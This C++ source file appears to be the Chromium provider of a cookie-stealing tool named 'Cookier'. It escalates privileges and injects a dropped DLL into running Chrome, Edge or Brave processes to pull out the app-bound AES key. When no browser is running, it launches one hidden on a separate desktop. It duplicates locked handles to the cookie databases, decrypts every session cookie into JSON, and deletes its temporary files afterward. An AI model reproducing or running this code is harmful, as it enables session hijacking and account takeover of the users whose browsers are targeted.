#define PROVIDER_EXPORTS
#include "../../src/Cookier.h"
#include <windows.h>
#include <shlobj.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <sqlite3.h>
#include <winternl.h>
#include <fstream>
#include <vector>
#include <string>
#include <filesystem>
#include <thread>
#include <chrono>
#include <unordered_map>
#include <iostream>
#include <sstream>
#include <cstring>
#include <cstdio>
#include <cstdarg>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "sqlite3.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "user32.lib")

namespace fs = std::filesystem;

static bool g_verbose = false;
static bool g_debug = false;
static const char* KEY_CHROME = "C:\\Users\\Public\\chrome_abe_key.bin";
static const char* KEY_EDGE   = "C:\\Users\\Public\\edge_abe_key.bin";
static const char* KEY_BRAVE  = "C:\\Users\\Public\\brave_abe_key.bin";

static void Log(const char* src, const char* fmt, ...) {
    if (!g_debug) return;
    char msg[2048];
    va_list ap; va_start(ap, fmt);
    _vsnprintf_s(msg, sizeof(msg), _TRUNCATE, fmt, ap);
    va_end(ap);
    SYSTEMTIME st; GetLocalTime(&st);
    char line[2300];
    int n = _snprintf_s(line, sizeof(line), _TRUNCATE,
        "[%02d:%02d:%02d.%03d] [%-8s] [pid=%5lu] %s\r\n",
        st.wHour, st.wMinute, st.wSecond, st.wMilliseconds,
        src, GetCurrentProcessId(), msg);
    if (n < 0) n = (int)strlen(line);
    if (n <= 0) return;
    HANDLE h = CreateFileW(L"C:\\Users\\Public\\cookier_debug.log",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(h, line, (DWORD)n, &w, NULL); CloseHandle(h);
    }
}

static void EnableDebug(bool enable) {
    g_debug = enable;
    if (enable) {
        HANDLE h = CreateFileW(L"C:\\Users\\Public\\cookier_debug.log",
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
        h = CreateFileW(L"C:\\Users\\Public\\cookier_debug_enabled",
            GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) CloseHandle(h);
    }
}

static std::string Narrow(const std::wstring& w) {
    if (w.empty()) return {};
    int n = WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), nullptr, 0, nullptr, nullptr);
    std::string out(n, '\0');
    WideCharToMultiByte(CP_UTF8, 0, w.data(), (int)w.size(), out.data(), n, nullptr, nullptr);
    return out;
}

static std::string EscapeJson(const std::string& s) {
    std::string out; out.reserve(s.size() + 16);
    for (unsigned char c : s) {
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            case '\b': out += "\\b"; break;
            case '\f': out += "\\f"; break;
            default:
                if (c < 0x20) { char buf[8]; snprintf(buf, sizeof(buf), "\\u%04x", c); out += buf; }
                else out += (char)c;
        }
    }
    return out;
}

static void EnablePrivilege(LPCWSTR privilege) {
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        TOKEN_PRIVILEGES tp; tp.PrivilegeCount = 1; tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (LookupPrivilegeValueW(NULL, privilege, &tp.Privileges[0].Luid))
            AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
        CloseHandle(hToken);
    }
}

static std::wstring ProcessName(const std::string& browser) {
    if (browser == "edge")  return L"msedge.exe";
    if (browser == "brave") return L"brave.exe";
    return L"chrome.exe";
}

static std::wstring UserDataPath(const std::string& browser) {
    PWSTR local = nullptr; SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &local);
    std::wstring p(local); CoTaskMemFree(local);
    if (browser == "edge")  return p + L"\\Microsoft\\Edge\\User Data";
    if (browser == "brave") return p + L"\\BraveSoftware\\Brave-Browser\\User Data";
    return p + L"\\Google\\Chrome\\User Data";
}

static const char* KeyFileFor(const std::string& browser) {
    if (browser == "edge")  return KEY_EDGE;
    if (browser == "brave") return KEY_BRAVE;
    return KEY_CHROME;
}

static std::wstring ReadRegStr(HKEY root, LPCWSTR subkey, LPCWSTR value) {
    HKEY h;
    if (RegOpenKeyExW(root, subkey, 0, KEY_READ, &h) != ERROR_SUCCESS) return L"";
    wchar_t buf[MAX_PATH * 2]; DWORD sz = sizeof(buf); DWORD type = 0;
    LSTATUS s = RegQueryValueExW(h, value, nullptr, &type, (LPBYTE)buf, &sz);
    RegCloseKey(h);
    if (s != ERROR_SUCCESS || type != REG_SZ) return L"";
    return std::wstring(buf);
}

static std::wstring FindBrowserExe(const std::string& browser) {
    std::vector<std::wstring> candidates;
    if (browser == "edge") {
        candidates = { L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
                       L"C:\\Program Files\\Microsoft\\Edge\\Application\\msedge.exe" };
    } else if (browser == "brave") {
        std::wstring reg = ReadRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe", L"");
        if (!reg.empty() && fs::exists(reg)) { Log("PROVIDER", "FindBrowserExe[brave] via HKLM App Paths -> %ls", reg.c_str()); return reg; }
        reg = ReadRegStr(HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\brave.exe", L"");
        if (!reg.empty() && fs::exists(reg)) { Log("PROVIDER", "FindBrowserExe[brave] via HKLM WOW64 App Paths -> %ls", reg.c_str()); return reg; }
        candidates = { L"C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe",
                       L"C:\\Program Files (x86)\\BraveSoftware\\Brave-Browser\\Application\\brave.exe" };
        PWSTR local = nullptr;
        if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, nullptr, &local))) {
            candidates.push_back(std::wstring(local) + L"\\BraveSoftware\\Brave-Browser\\Application\\brave.exe");
            CoTaskMemFree(local);
        }
    } else {
        candidates = { L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
                       L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe" };
    }
    for (auto& p : candidates) if (fs::exists(p)) { Log("PROVIDER", "FindBrowserExe[%s] -> %ls", browser.c_str(), p.c_str()); return p; }
    Log("PROVIDER", "FindBrowserExe[%s] -> NOT FOUND", browser.c_str());
    return L"";
}

static std::vector<DWORD> GetPids(const std::wstring& name) {
    std::vector<DWORD> pids; PROCESSENTRY32W pe = { sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32FirstW(snap, &pe)) { do { if (_wcsicmp(pe.szExeFile, name.c_str()) == 0) pids.push_back(pe.th32ProcessID); } while (Process32NextW(snap, &pe)); }
    CloseHandle(snap);
    Log("PROVIDER", "GetPids[%ls] -> %zu pid(s)", name.c_str(), pids.size());
    return pids;
}

static void KillPids(const std::vector<DWORD>& pids) {
    for (DWORD pid : pids) { HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid); if (h) { TerminateProcess(h, 0); CloseHandle(h); } }
}

static int InjectDll(const std::string& dllPathA, DWORD pid) {
    Log("PROVIDER", "InjectDll -> pid=%lu", pid);
    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, pid);
    if (!hProcess) { Log("PROVIDER", "InjectDll: OpenProcess(pid=%lu) failed err=%lu", pid, GetLastError()); return 0; }
    LPVOID remoteMem = VirtualAllocEx(hProcess, nullptr, dllPathA.size() + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteMem) { Log("PROVIDER", "InjectDll: VirtualAllocEx failed"); CloseHandle(hProcess); return 0; }
    WriteProcessMemory(hProcess, remoteMem, dllPathA.c_str(), dllPathA.size() + 1, nullptr);
    HMODULE hKernel32 = GetModuleHandleW(L"kernel32.dll");
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA"), remoteMem, 0, nullptr);
    int result = 0;
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread);
        HMODULE hMods[1024]; DWORD cbNeeded;
        if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
            for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
                char szModName[MAX_PATH];
                if (GetModuleFileNameExA(hProcess, hMods[i], szModName, sizeof(szModName))) {
                    if (std::string(szModName).find("ChromiumInjector_") != std::string::npos) {
                        Log("PROVIDER", "InjectDll: ChromiumInjector loaded in pid=%lu at %s", pid, szModName);
                        HMODULE hLocal = LoadLibraryExA(dllPathA.c_str(), NULL, DONT_RESOLVE_DLL_REFERENCES);
                        if (hLocal) {
                            DWORD_PTR offset = (DWORD_PTR)GetProcAddress(hLocal, "TriggerDecryption") - (DWORD_PTR)hLocal;
                            FreeLibrary(hLocal);
                            LPVOID remoteFunc = (LPVOID)((DWORD_PTR)hMods[i] + offset);
                            HANDLE hTrigger = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteFunc, nullptr, 0, nullptr);
                            if (hTrigger) { WaitForSingleObject(hTrigger, INFINITE); CloseHandle(hTrigger); result = 1; Log("PROVIDER", "InjectDll: TriggerDecryption completed in pid=%lu", pid); }
                        }
                        break;
                    }
                }
            }
        }
    } else {
        Log("PROVIDER", "InjectDll: CreateRemoteThread failed err=%lu", GetLastError());
    }
    VirtualFreeEx(hProcess, remoteMem, 0, MEM_RELEASE); CloseHandle(hProcess);
    return result;
}

#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX { PVOID Object; ULONG_PTR UniqueProcessId; ULONG_PTR HandleValue; ULONG GrantedAccess; USHORT CreatorBackTraceIndex; USHORT ObjectTypeIndex; ULONG HandleAttributes; ULONG Reserved; } SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, *PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;
typedef struct _SYSTEM_HANDLE_INFORMATION_EX { ULONG_PTR NumberOfHandles; ULONG_PTR Reserved; SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1]; } SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;
typedef NTSTATUS (NTAPI *PNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);

static bool CopyHandleToFile(HANDLE hSource, const std::wstring& destPath) {
    LARGE_INTEGER size = {};
    if (!GetFileSizeEx(hSource, &size)) return false;
    if (size.QuadPart == 0) { HANDLE h = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); if (h != INVALID_HANDLE_VALUE) CloseHandle(h); return true; }
    HANDLE hMap = CreateFileMappingW(hSource, NULL, PAGE_READONLY, 0, 0, NULL);
    if (!hMap) return false;
    void* base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    if (!base) { CloseHandle(hMap); return false; }
    HANDLE hOut = CreateFileW(destPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    DWORD written = 0; BOOL ok = WriteFile(hOut, base, (DWORD)size.QuadPart, &written, NULL);
    CloseHandle(hOut); UnmapViewOfFile(base); CloseHandle(hMap);
    return ok && written == (DWORD)size.QuadPart;
}

static std::unordered_map<std::wstring, HANDLE> CopyCookiesViaHandleDuplication(const std::vector<DWORD>& pids) {
    std::unordered_map<std::wstring, HANDLE> locked;
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    auto NtQ = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    ULONG bufSize = 1 << 20; std::vector<BYTE> buffer(bufSize); ULONG returned = 0; NTSTATUS status = 0;
    for (int tries = 0; tries < 20; ++tries) {
        buffer.resize(bufSize);
        status = NtQ((SYSTEM_INFORMATION_CLASS)64, buffer.data(), bufSize, &returned);
        if (status == STATUS_INFO_LENGTH_MISMATCH) { bufSize = returned + 0x10000; continue; }
        break;
    }
    if (status < 0) { Log("PROVIDER", "CopyCookiesViaHandleDuplication: NtQuerySystemInformation failed 0x%08lx", (unsigned long)status); return locked; }
    auto info = reinterpret_cast<PSYSTEM_HANDLE_INFORMATION_EX>(buffer.data());
    std::unordered_map<DWORD, HANDLE> procHandles;
    for (DWORD pid : pids) { HANDLE h = OpenProcess(PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid); if (h) procHandles[pid] = h; }
    for (ULONG_PTR i = 0; i < info->NumberOfHandles; ++i) {
        auto& e = info->Handles[i]; auto it = procHandles.find((DWORD)e.UniqueProcessId); if (it == procHandles.end()) continue;
        HANDLE hDup = NULL;
        if (DuplicateHandle(it->second, (HANDLE)e.HandleValue, GetCurrentProcess(), &hDup, 0, FALSE, DUPLICATE_SAME_ACCESS)) {
            if (GetFileType(hDup) == FILE_TYPE_DISK) {
                wchar_t path[32768] = {}; DWORD len = GetFinalPathNameByHandleW(hDup, path, 32768, FILE_NAME_NORMALIZED | VOLUME_NAME_DOS);
                if (len > 0) {
                    std::wstring p(path, len);
                    if (p.find(L"Network\\Cookies") != std::wstring::npos) {
                        if (locked.find(p) == locked.end()) { locked[p] = hDup; Log("PROVIDER", "handle-dup captured: %ls", p.c_str()); continue; }
                    }
                }
            }
            CloseHandle(hDup);
        }
    }
    for (auto& pair : procHandles) CloseHandle(pair.second);
    Log("PROVIDER", "CopyCookiesViaHandleDuplication: %zu locked handle(s)", locked.size());
    return locked;
}

static std::vector<std::wstring> GetProfilesOnDisk(const std::wstring& userDataDir) {
    std::vector<std::wstring> profiles;
    try {
        for (const auto& entry : fs::directory_iterator(userDataDir, fs::directory_options::skip_permission_denied)) {
            try { if (entry.is_directory()) { fs::path c = entry.path() / L"Network" / L"Cookies"; if (fs::exists(c)) { profiles.push_back(entry.path().filename().wstring()); } } } catch (...) {}
        }
    } catch (...) {}
    Log("PROVIDER", "GetProfilesOnDisk: %zu profile(s)", profiles.size());
    return profiles;
}

static std::string ExtractCookiesFromDb(const std::wstring& dbPath, const std::vector<BYTE>& aesKey) {
    sqlite3* db = nullptr;
    if (sqlite3_open_v2(Narrow(dbPath).c_str(), &db, SQLITE_OPEN_READONLY, nullptr) != SQLITE_OK) { if (db) sqlite3_close(db); Log("PROVIDER", "ExtractCookiesFromDb: open failed"); return ""; }
    sqlite3_stmt* stmt = nullptr;
    if (sqlite3_prepare_v2(db, "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies;", -1, &stmt, nullptr) != SQLITE_OK) { sqlite3_close(db); Log("PROVIDER", "ExtractCookiesFromDb: prepare failed"); return ""; }

    std::string out; out.reserve(16384);
    bool first = true;
    int rows = 0, decrypted = 0;

    while (sqlite3_step(stmt) == SQLITE_ROW) {
        rows++;
        const unsigned char* hk = sqlite3_column_text(stmt, 0);
        const unsigned char* nm = sqlite3_column_text(stmt, 1);
        const void* enc = sqlite3_column_blob(stmt, 2); int encLen = sqlite3_column_bytes(stmt, 2);
        const unsigned char* pt = sqlite3_column_text(stmt, 3);
        long long expires = sqlite3_column_int64(stmt, 4);
        int secure = sqlite3_column_int(stmt, 5);
        int httponly = sqlite3_column_int(stmt, 6);

        std::string value;
        if (enc && encLen >= 31 && ((BYTE*)enc)[0] == 'v' && ((BYTE*)enc)[1] == '2' && ((BYTE*)enc)[2] == '0') {
            BCRYPT_ALG_HANDLE hAlg; BCRYPT_KEY_HANDLE hKey;
            if (BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) {
                BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
                if (BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)aesKey.data(), 32, 0))) {
                    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO ai; BCRYPT_INIT_AUTH_MODE_INFO(ai);
                    ai.pbNonce = (PUCHAR)enc + 3; ai.cbNonce = 12; ai.pbTag = (PUCHAR)enc + encLen - 16; ai.cbTag = 16;
                    std::vector<BYTE> plain(encLen - 31); ULONG plainLen = 0;
                    if (BCRYPT_SUCCESS(BCryptDecrypt(hKey, (PUCHAR)enc + 15, encLen - 31, &ai, nullptr, 0, plain.data(), (ULONG)plain.size(), &plainLen, 0))) {
                        decrypted++;
                        BYTE* pData = plain.data(); ULONG dataLen = plainLen;
                        if (hk && dataLen >= 32) {
                            BCRYPT_ALG_HANDLE hSha; BCRYPT_HASH_HANDLE hHash = NULL; BYTE hash[32] = {};
                            if (BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hSha, BCRYPT_SHA256_ALGORITHM, nullptr, 0))) {
                                if (BCRYPT_SUCCESS(BCryptCreateHash(hSha, &hHash, nullptr, 0, nullptr, 0, 0))) {
                                    BCryptHashData(hHash, (PUCHAR)hk, (ULONG)strlen((const char*)hk), 0);
                                    BCryptFinishHash(hHash, hash, 32, 0);
                                    BCryptDestroyHash(hHash);
                                    if (memcmp(pData, hash, 32) == 0) { pData += 32; dataLen -= 32; }
                                }
                                BCryptCloseAlgorithmProvider(hSha, 0);
                            }
                        }
                        value.assign(pData, pData + dataLen);
                    } else { Log("PROVIDER", "BCryptDecrypt failed for host=%s name=%s", (const char*)hk, (const char*)nm); }
                    BCryptDestroyKey(hKey);
                }
                BCryptCloseAlgorithmProvider(hAlg, 0);
            }
        }

        if (!first) out += ",\n";
        first = false;
        out += "    {\n";
        out += "      \"host_key\": \""; out += EscapeJson((const char*)hk); out += "\",\n";
        out += "      \"name\": \""; out += EscapeJson((const char*)nm); out += "\",\n";
        out += "      \"value\": \""; out += EscapeJson(value); out += "\",\n";
        out += "      \"path\": \""; out += EscapeJson((const char*)pt); out += "\",\n";
        out += "      \"expires_utc\": "; out += std::to_string(expires); out += ",\n";
        out += "      \"is_secure\": "; out += (secure ? "true" : "false"); out += ",\n";
        out += "      \"is_httponly\": "; out += (httponly ? "true" : "false"); out += "\n";
        out += "    }";
    }

    sqlite3_finalize(stmt); sqlite3_close(db);
    Log("PROVIDER", "ExtractCookiesFromDb: %d row(s), %d decrypted", rows, decrypted);
    return out;
}

extern "C" bool ExtractGeckoCookies(char** outJson, const char* browserName, const char* profileList, bool verbose);

extern "C" PROVIDER_API bool ExtractCookies(char** outJson, const char* browserName, const char* profileList, bool verbose) {
    {
        std::string __b = browserName ? browserName : "chrome";
        if (__b == "firefox" || __b == "librewolf" || __b == "waterfox") {
            return ExtractGeckoCookies(outJson, browserName, profileList, verbose);
        }
    }
    g_verbose = verbose;
    EnableDebug(verbose);
    std::string browser = browserName ? browserName : "chrome";
    Log("PROVIDER", "===== ExtractCookies start: browser=%s profiles=%s verbose=%d =====", browser.c_str(), profileList ? profileList : "(null)", verbose ? 1 : 0);

    CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    EnablePrivilege(L"SeDebugPrivilege"); EnablePrivilege(L"SeBackupPrivilege");
    bool weLaunched = false;

    try {
        DeleteFileA(KEY_CHROME); DeleteFileA(KEY_EDGE); DeleteFileA(KEY_BRAVE);
        std::wstring userDataDir = UserDataPath(browser);
        std::wstring processName = ProcessName(browser);
        const char* keyFile = KeyFileFor(browser);
        Log("PROVIDER", "userDataDir=%ls", userDataDir.c_str());
        Log("PROVIDER", "processName=%ls", processName.c_str());
        Log("PROVIDER", "keyFile=%s", keyFile);

        auto allProfiles = GetProfilesOnDisk(userDataDir);
        std::vector<std::wstring> targetProfiles;
        if (std::string(profileList) == "all") {
            targetProfiles = allProfiles;
        } else {
            std::stringstream ss(profileList); std::string item;
            while (std::getline(ss, item, ',')) {
                std::wstring w(item.begin(), item.end());
                for (auto& p : allProfiles) if (p == w) { targetProfiles.push_back(p); break; }
            }
        }
        Log("PROVIDER", "targetProfiles=%zu", targetProfiles.size());

        wchar_t tempPath[MAX_PATH]; GetTempPathW(MAX_PATH, tempPath);
        std::wstring dllPath = std::wstring(tempPath) + L"ChromiumInjector_" + std::to_wstring(GetCurrentProcessId()) + L".dll";
        DeleteFileW(dllPath.c_str());

        HMODULE hSelf = NULL;
        GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)ExtractCookies, &hSelf);
        HRSRC hRes = FindResourceW(hSelf, MAKEINTRESOURCEW(101), MAKEINTRESOURCEW(10));
        if (!hRes) { Log("PROVIDER", "FindResource(101) FAILED"); throw std::runtime_error("Failed to find ChromiumInjector resource in provider DLL"); }
        HGLOBAL hMem = LoadResource(hSelf, hRes); void* pData = LockResource(hMem); DWORD sz = SizeofResource(hSelf, hRes);
        std::ofstream ofs(dllPath, std::ios::binary); ofs.write((char*)pData, sz); ofs.close();
        Log("PROVIDER", "wrote injector to %ls (%lu bytes)", dllPath.c_str(), sz);

        std::string dllPathA = Narrow(dllPath);
        auto pids = GetPids(processName);
        if (pids.empty()) {
            weLaunched = true;
            std::wstring exe = FindBrowserExe(browser);
            if (exe.empty()) throw std::runtime_error(browser + " executable not found");
            HDESK hDesk = CreateDesktopW(L"ChromiumExtractorDesktop", NULL, NULL, 0, GENERIC_ALL, NULL);
            STARTUPINFOW si = { sizeof(si) }; si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; if (hDesk) si.lpDesktop = L"ChromiumExtractorDesktop";
            PROCESS_INFORMATION pi = {};
            std::wstring cmd = L"\"" + exe + L"\" --no-first-run --disable-gpu about:blank";
            std::vector<wchar_t> cmdBuf(cmd.begin(), cmd.end()); cmdBuf.push_back(L'\0');
            BOOL ok = CreateProcessW(nullptr, cmdBuf.data(), nullptr, nullptr, FALSE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
            Log("PROVIDER", "CreateProcess(%ls) -> %d", exe.c_str(), ok);
            CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
            for (int i = 0; i < 10; ++i) { std::this_thread::sleep_for(std::chrono::seconds(1)); pids = GetPids(processName); if (!pids.empty()) break; }
        }

        if (pids.empty()) { Log("PROVIDER", "no pids -> throwing"); throw std::runtime_error(browser + " not running and failed to launch"); }
        for (DWORD pid : pids) InjectDll(dllPathA, pid);

        bool keyFound = false;
        Log("PROVIDER", "waiting for key file (100 x 200ms = 20s max)");
        for (int i = 0; i < 100; ++i) {
            std::this_thread::sleep_for(std::chrono::milliseconds(200));
            if (GetFileAttributesA(keyFile) != INVALID_FILE_ATTRIBUTES) { keyFound = true; Log("PROVIDER", "key file appeared at tick=%d (%dms)", i, (i + 1) * 200); break; }
            if (i > 0 && (i % 10) == 0) Log("PROVIDER", "wait progress: %d/100", i);
        }
        if (!keyFound) { Log("PROVIDER", "TIMEOUT: key file never appeared"); throw std::runtime_error("Timed out waiting for AES key"); }

        std::ifstream kf(keyFile, std::ios::binary);
        std::vector<BYTE> aesKey((std::istreambuf_iterator<char>(kf)), {});
        Log("PROVIDER", "AES key size=%zu (expected 32)", aesKey.size());
        if (aesKey.size() != 32) throw std::runtime_error("Invalid AES key length");

        auto locked = CopyCookiesViaHandleDuplication(pids);

        std::string out = "{\n";
        bool firstProfile = true;
        for (auto& profile : targetProfiles) {
            std::wstring dbPath = userDataDir + L"\\" + profile + L"\\Network\\Cookies";
            std::wstring destBase = L"C:\\Users\\Public\\chromium_extract_" + profile;
            std::wstring destDb = destBase + L".db";
            std::wstring suffix = L"\\" + profile + L"\\Network\\Cookies";
            HANDLE hDb = NULL, hWal = NULL, hShm = NULL;
            for (auto& pair : locked) {
                if (pair.first.find(suffix) != std::wstring::npos) {
                    if (pair.first.find(L"-wal") != std::wstring::npos) hWal = pair.second;
                    else if (pair.first.find(L"-shm") != std::wstring::npos) hShm = pair.second;
                    else hDb = pair.second;
                }
            }
            bool copied = false;
            if (hDb) copied = CopyHandleToFile(hDb, destDb);
            else if (fs::exists(dbPath)) copied = CopyFileW(dbPath.c_str(), destDb.c_str(), FALSE);
            Log("PROVIDER", "profile=%ls copied=%d hDb=%p hWal=%p hShm=%p", profile.c_str(), copied ? 1 : 0, hDb, hWal, hShm);
            if (!copied) continue;

            std::wstring walPath = dbPath + L"-wal"; std::wstring destWal = destBase + L".db-wal";
            if (hWal) CopyHandleToFile(hWal, destWal);
            else if (fs::exists(walPath)) CopyFileW(walPath.c_str(), destWal.c_str(), FALSE);
            std::wstring shmPath = dbPath + L"-shm"; std::wstring destShm = destBase + L".db-shm";
            if (hShm) CopyHandleToFile(hShm, destShm);
            else if (fs::exists(shmPath)) CopyFileW(shmPath.c_str(), destShm.c_str(), FALSE);

            std::string profileJson = ExtractCookiesFromDb(destDb, aesKey);
            DeleteFileW(destDb.c_str()); DeleteFileW(destWal.c_str()); DeleteFileW(destShm.c_str());

            if (!firstProfile) out += ",\n";
            firstProfile = false;
            out += "  \"" + EscapeJson(Narrow(profile)) + "\": [";
            if (!profileJson.empty()) {
                out += "\n" + profileJson + "\n  ]";
            } else {
                out += "]";
            }
        }
        if (firstProfile) out += "}";
        else out += "\n}";

        for (auto& pair : locked) CloseHandle(pair.second);

        *outJson = (char*)CoTaskMemAlloc(out.length() + 1);
        if (*outJson) memcpy(*outJson, out.c_str(), out.length() + 1);

        DeleteFileA(keyFile); DeleteFileW(dllPath.c_str());
        if (weLaunched) KillPids(pids);
        CoUninitialize();
        Log("PROVIDER", "===== ExtractCookies SUCCESS: out=%zu bytes =====", out.size());
        DeleteFileW(L"C:\\Users\\Public\\cookier_debug_enabled");
        return true;
    } catch (const std::exception& e) {
        std::cerr << "[!] ChromiumProvider Error: " << e.what() << "\n";
        Log("PROVIDER", "===== ExtractCookies FAILED: %s =====", e.what());
        if (weLaunched) { auto p = GetPids(ProcessName(browser)); KillPids(p); }
        CoUninitialize();
        DeleteFileW(L"C:\\Users\\Public\\cookier_debug_enabled");
        return false;
    }
}